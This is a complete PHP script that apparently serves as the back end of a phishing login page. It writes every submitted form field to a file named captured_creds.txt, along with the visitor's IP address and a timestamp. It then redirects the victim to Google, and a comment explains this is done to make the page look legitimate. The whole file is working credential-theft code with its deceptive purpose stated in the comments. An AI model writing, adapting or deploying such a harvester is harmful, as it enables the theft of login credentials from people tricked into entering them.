<?php
// Create logs directory if it doesn't exist
$log_dir = "logs";
if (!file_exists($log_dir)) {
    mkdir($log_dir, 0755, true);
}

// Log file path
$log_file = $log_dir . "/captured_creds.txt";

// Open file for appending
$file = fopen($log_file, "a");

// Get timestamp
$timestamp = date("Y-m-d H:i:s");

// Get IP address
$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

// Write credentials to file
fwrite($file, "=== Login Attempt at $timestamp ===\n");
fwrite($file, "IP Address: $ip\n");
foreach($_POST as $key => $value) {
    fwrite($file, "$key: $value\n");
}
fwrite($file, "===============================\n\n");

// Close file
fclose($file);

// Redirect to Google (makes it look legitimate)
header("Location: https://www.google.com");
exit;
?>